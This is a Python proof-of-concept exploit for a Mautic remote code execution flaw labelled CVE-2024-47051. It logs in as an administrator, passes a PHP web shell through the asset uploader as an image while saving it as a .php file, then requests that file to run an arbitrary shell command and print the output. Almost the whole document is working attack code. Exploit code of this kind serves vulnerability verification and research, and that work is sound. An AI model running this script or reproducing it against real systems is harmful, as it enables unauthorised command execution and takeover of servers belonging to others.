#!/usr/bin/env python3
import requests
import re
import sys
import argparse

class MauticExploit:
    def __init__(self, base_url, username, password):
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()

    def login(self):
        login_url = f"{self.base_url}/s/login"
        resp = self.session.get(login_url)
        
        match = re.search(r'name="_csrf_token"\s+value="([^"]+)"', resp.text)
        csrf_token = match.group(1) if match else ''
        
        login_data = {
            '_username': self.username,
            '_password': self.password,
            '_csrf_token': csrf_token,
        }
        
        resp = self.session.post(f"{self.base_url}/s/login_check", data=login_data, allow_redirects=True)
        
        if '/s/dashboard' in resp.url:
            print(f"[+] Login successful as {self.username}")
            return True
        print(f"[-] Login failed")
        return False

    def upload_malicious_asset(self, command="id"):
        php_code = f'<?php echo "VULN_START"; system("{command}"); echo "VULN_END"; ?>'
        
        new_asset_url = f"{self.base_url}/s/assets/new"
        resp = self.session.get(new_asset_url)
        
        match = re.search(r'id="asset_tempId"[^>]*value="([^"]+)"', resp.text, re.DOTALL)
        temp_id = match.group(1) if match else None
        
        match = re.search(r'id="asset__token"[^>]*value="([^"]+)"', resp.text, re.DOTALL)
        form_token = match.group(1) if match else ''
        
        print(f"[*] Temp ID: {temp_id}")
        
        files = {
            'file': ('shell.png', php_code.encode(), 'image/png')
        }
        data = {
            'tempId': temp_id
        }
        
        upload_url = f"{self.base_url}/s/_uploader/asset/upload"
        resp = self.session.post(upload_url, files=files, data=data)
        
        tmp_filename = None
        try:
            json_resp = resp.json()
            tmp_filename = json_resp.get('tmpFileName')
        except:
            pass
        
        print(f"[*] Temp Filename: {tmp_filename}")
        
        if not temp_id or not tmp_filename:
            print("[-] Failed to get required values")
            return None
        
        asset_data = {
            'asset[title]': 'RCETest',
            'asset[alias]': '',
            'asset[tempName]': tmp_filename,
            'asset[tempId]': temp_id,
            'asset[originalFileName]': 'shell.php',
            'asset[storageLocation]': 'local',
            'asset[language]': 'en',
            'asset[category]': '',
            'asset[description]': '',
            'asset[publishUp]': '',
            'asset[publishDown]': '',
            'asset[isPublished]': '1',
            'asset[disallow]': '0',
            'asset[_token]': form_token,
            'asset[buttons][save]': ''
        }
        
        resp = self.session.post(new_asset_url, data=asset_data, allow_redirects=True)
        
        asset_id = None
        match = re.search(r'/s/assets/view/(\d+)', resp.url)
        if match:
            asset_id = match.group(1)
        else:
            match = re.search(r'/s/assets/view/(\d+)', resp.text)
            if match:
                asset_id = match.group(1)
        
        if asset_id:
            print(f"[+] Asset created with ID: {asset_id}")
            return self.get_uploaded_filename(asset_id)
        print("[-] Failed to create asset")
        return None

    def get_uploaded_filename(self, asset_id):
        asset_url = f"{self.base_url}/s/assets/view/{asset_id}"
        resp = self.session.get(asset_url)
        
        match = re.search(r'([a-f0-9]{40})\.php', resp.text)
        if match:
            return f"{match.group(1)}.php"
        return None

    def execute_payload(self, filename):
        payload_url = f"{self.base_url}/media/files/{filename}"
        print(f"[*] Payload URL: {payload_url}")
        
        resp = self.session.get(payload_url)
        
        if resp.status_code == 200:
            if 'VULN_START' in resp.text:
                match = re.search(r'VULN_START(.+?)VULN_END', resp.text, re.DOTALL)
                if match:
                    output = match.group(1).strip()
                    print(f"[+] RCE Successful!")
                    print(f"[+] Output:\n{output}")
                    return True, output
            print(f"[+] File accessible (Status 200)")
            return True, resp.text[:200]
        elif resp.status_code == 403:
            print(f"[!] Uploaded but blocked (403)")
            return True, "blocked"
        print(f"[-] Status: {resp.status_code}")
        return False, None


def main():
    parser = argparse.ArgumentParser(description='CVE-2024-47051 PoC')
    parser.add_argument('--url', default='http://localhost:8080')
    parser.add_argument('--username', default='admin')
    parser.add_argument('--password', default='Mautic@2026!Secure')
    parser.add_argument('--command', default='id')
    args = parser.parse_args()

    print("[*] CVE-2024-47051 - Mautic RCE")
    print(f"[*] Target: {args.url}")
    
    exploit = MauticExploit(args.url, args.username, args.password)
    
    if not exploit.login():
        sys.exit(1)
    
    print("[*] Uploading malicious PHP file...")
    filename = exploit.upload_malicious_asset(args.command)
    
    if filename:
        print(f"[+] Uploaded: {filename}")
        success, output = exploit.execute_payload(filename)
        if success:
            print("[+] Vulnerability verified!")
            return 0
    return 1


if __name__ == '__main__':
    sys.exit(main())
